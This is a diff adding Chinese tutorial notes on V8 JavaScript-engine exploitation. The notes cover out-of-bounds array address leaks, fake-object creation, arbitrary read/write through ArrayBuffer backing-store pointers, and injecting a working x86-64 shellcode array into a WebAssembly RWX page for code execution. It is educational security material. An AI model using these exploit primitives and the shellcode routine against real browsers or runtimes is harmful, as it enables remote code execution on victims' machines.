@@ -218,3 +218,211 @@ v8通过将查询结果存储到指令处来减少查询属性的用时。当生
 注意pwndbg中的一些命令会与v8冲突，只能通过更换其他调试器解决。以下是一些调试相关的资源
 - [v8-debugging-tools](https://github.com/JeremyFetiveau/debugging-tools)
 - [Tips and Tricks for Node.js Core Development and Debugging](https://joyeecheung.github.io/blog/2018/12/31/tips-and-tricks-node-core)
+
+## [Part 6](https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6)
+
+现在假设v8题目中存在漏洞，允许我们对array进行任意读写，忽视array真正的长度和原本的边界
+
+v8存储数据的布局中比较重要的内容如下：
+- 浮点数（floats）以64位表示
+- 指针以32位表示，lsb固定为1
+- 整数以31位表示，lsb固定为0
+- 可以用BigInt相互转换64位整数和浮点数
+- 数组的类型决定数组中的每个元素位（slot）是64位还是32位
+
+利用越界读数组+字符串数组泄漏地址：
+```js
+oob_array = [1.1, 2.2, 3.3, 4.4, 5.5];
+victim = [{}, {}, {}, {}, {}];
+
+// trigger some vulnerability to get OOB access
+
+// place target object in victim array
+victim[0] = a;
+
+// float representation of TaggedPtr to a
+console.log(lower_32(float_to_int(oob_array[8])));
+```
+注意偏移和实际数组的布局都是假设，仅作基础的原理展示。假设上述设置在内存中的布局如下：
+```
+        4 bytes       
++--------------------+    <- begin oob_array's backing store
+-       map ptr      -
++--------------------+
+-   length of store  -
++--------------------+
+-    oob_array[0]    -
++--------------------+
+-    oob_array[0]    -
++--------------------+
+...
++--------------------+
+-    oob_array[4]    -
++--------------------+
+-    oob_array[4]    -
++--------------------+    <- begin victim
+-       map ptr      -
++--------------------+
+-   properties ptr   -
++--------------------+
+-  backing store ptr -    ----------------------------------
++--------------------+                                      |
+-   length of array  -                                      |
++--------------------+    <- begin victim's backing store <-
+-       map ptr      -
++--------------------+
+-   length of store  -
++--------------------+
+-      victim[0]     -    <- pointer to a, oob_array[8] lower_32
++--------------------+
+-      victim[1]     -    <- oob_array[8] upper_32
++--------------------+
+...
+```
+victim数组存储objects，但oob_array存储浮点数。因此，对oob_array的越界读可以用浮点数的形式读取a的地址，解码成整数再减一即可得到真正的内存地址
+
+浮点数没有lsb固定为0或者1的限制，因此在读写指针方面比整数好用不少，虽然需要经过一些类型转换
+
+利用越界写数组修改其他数组的内存布局：
+```js
+oob_array = [1.1, 2.2, 3.3, 4.4, 5.5];
+victim = [{}, {}, {}, {}, {}];
+
+// trigger some vulnerability to get OOB access
+
+// place target object in victim array
+victim[0] = a;
+
+oob_array[8] = int_to_float(address_we_want + 1);
+
+return victim[0];
+```
+现在当我们访问`victim[0]`时，得到的已经不是a了，而是我们构造的位于`address_we_want`的fake object。注意要保证`address_we_want`处的fake object拥有正确的结构，参考 https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-5/#exploring-the-object-layout 。其中一个用法是创建两个object，泄漏两者的地址后交换它们的map，backing store或者length等字段
+
+利用越界读写数组实现任意地址写：
+```js
+oob_array = [1.1, 2.2, 3.3, 4.4, 5.5];
+victim = [1.1, 2.2, 3.3, 4.4, 5.5];
+
+// trigger some vulnerability to get OOB access
+    
+function arb_read(addr) {
+    // we need to subtract 8 because a backing store starts with 2, 4-byte pointers
+    oob_array[6] = int_to_float((addr + 1) - 8);
+    
+    return float_to_int(victim[0]);
+}
+
+function arb_write(addr, val) {    
+    // we need to subtract 8 because a backing store starts with 2, 4-byte pointers
+    oob_array[6] = int_to_float((addr + 1) - 8);
+    
+    victim[0] = int_to_float(val);
+}
+```
+查看第一个例子里提供的图表，发现victim对象的backing store指针指向对象的末尾，数据开始的地方。如果我们覆盖这个指针，等同于告诉v8访问任意地址处的内存
+
+注意以浮点数形式覆盖指针实际上会损坏相邻的指针，因为浮点数占8个字节而指针只占4个字节。在实际的漏洞利用中必须考虑这点，恢复那个相邻的指针
+
+这个例子说是任意地址读写，其实不完全是。v8中的指针都是相对于基地址的偏移，所以这个办法不能脱离基地址读写其他地方。需要改变基地址才能访问这段区域之外的内存，这就需要用到ArrayBuffers了
+
+ArrayBuffers类似array，但可以更简单地写入二进制数据。ArrayBuffers可以在连续的内存区域中写二进制数据，区别于数组会根据存储元素的位置改变内存布局。可以设置与ArrayBuffers交互的形式，如整数，浮点数等，且不必担心ArrayBuffers变成"holey"。最重要的是，ArrayBuffer的backing store指针是64位的。例子：
+```js
+// create ArrayBuffer and dataview
+buf = new ArrayBuffer(NUM_BYTES);
+dataview = new DataView(buf);
+
+// get the address of buf's backing store
+buf_addr = addrOf(buf);
+backing_store_addr = buf_addr + 0x14n;
+
+// overwrite the backing store pointer with a pointer to our desired memory location
+arb_write(backing_store_addr + 1, RW_MEM_LOCATION);
+
+// write dword to RW_MEM_LOCATION
+dataview.setUint32(0, 0x41424344, true);
+```
+有了任意地址读写后就能了解一种最简单的RCE方式了。WebAssembly JIT代码段的权限是rwx，只需往里面写shellcode并控制程序流到此处即可。首先需要添加WebAssembly：
+```js
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+```
+wasm_code的内容不重要，比如案例中wasm_code的内容仅仅是返回42
+
+这段代码使v8创建一块0x1000字节大小的RWX内存区域，用于存储生成的机器码。然而上文的AddrOf（指的应该是第一个例子）不足以泄漏这块区域的地址。还好这个地址存储在创建的WebAssembly实例里，位于某个偏移处。这个偏移在不同的v8版本里不一样，需要自行用gdb查看。参考这个脚本：
+```js
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+
+%DebugPrint(f);
+
+console.log("\nvmmap to get the RWX page address");
+console.log("search -x [little_endian_address]");
+console.log("Subtract the address of wasm_instance from the address of our pointer");
+
+while(1){}
+
+// gdb d8
+// r wasm_offset_finder.js --allow-natives-syntax
+// Ctrl+C
+```
+步骤如下：
+1. 找到RWX页的起始内存地址
+2. 寻找指向这个地址的指针（就在WASM实例的起始地址后面一点点）
+3. 计算这个指针与WASM实例的偏移
+
+得到偏移后可以像这样注入shellcode并调用：
+```js
+// https://xz.aliyun.com/t/5003 (tested on ubuntu 20.04)
+var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e, 0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
+
+// get address of RWX memory
+rwx_page_addr = arb_read(tagInt(addrOf(wasm_instance)) + WASM_PAGE_OFFSET);
+
+// create dataview for easy memory writing
+let buf = new ArrayBuffer(shellcode.length * 4);
+let dataview = new DataView(buf);
+
+// move dataview to RWX memory
+let buf_addr = addrOf(buf);
+let backing_store_addr = buf_addr + 0x14n;
+arb_write(tagInt(backing_store_addr), rwx_page_addr);
+
+// copy shellcode
+for (let i = 0; i < shellcode.length; i++) {
+	dataview.setUint32(4 * i, shellcode[i], true);
+}
+	
+// jump to RWX memory
+//调用WebAssembly函数从而执行shellcode
+f();
+
+// credit: https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/
+```
+利用数组的越界访问获取RCE的完整例子见 https://www.madstacks.dev/assets/exploits/exploit_skeleton.js 。脚本里还有很多辅助函数（Helper Functions
+），主要是一些ArrayBuffers的用法以及如何转换数据类型。还包含了一些处理32位和64位数据以及指针压缩的函数
+
+不要多次尝试触发漏洞。一次命中最好，因为多余的循环会扰乱堆的布局，遇见垃圾处理器（garbage collector）的相关问题，或是直接崩溃。最好用全局变量来利用漏洞，而不是像前文的例子一样用局部变量。遵循这些原则后可以得到一个可靠的堆布局
+
+另一个常见的问题是漏洞不提供大范围的越界读写。这种情况下修改相邻array的length属性即可。创建一个整数的oob_array，这样越界写length属性时不需要担心数据类型问题
+```js
+oob_array = [1, 2, 3, 4, 5];
+victim = [{}, {}, {}, {}, {}];
+
+// trigger some vulnerability to get OOB access
+
+console.log(victim.length);
+// 5
+oob_array[9] = 10;
+console.log(victim.length);
+// 10
+```
+相邻victim array的length属性大概在oob_array后4 words的地方。如果只能越界一个索引，这篇[wp](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth)介绍了一个不错的技巧；如果能越界两个索引，用一个float数组并只修改高32位即可
+
+另一个提高exp的稳定性的原则是“恢复被覆盖的旧值”，防止各种随机的崩溃
+
+最后，很多exp都会标记特殊的值从而标记并确保堆布局正确。可以考虑在exp里添加某些浮点数并在触发漏洞后确认这些值在期望的正确位置
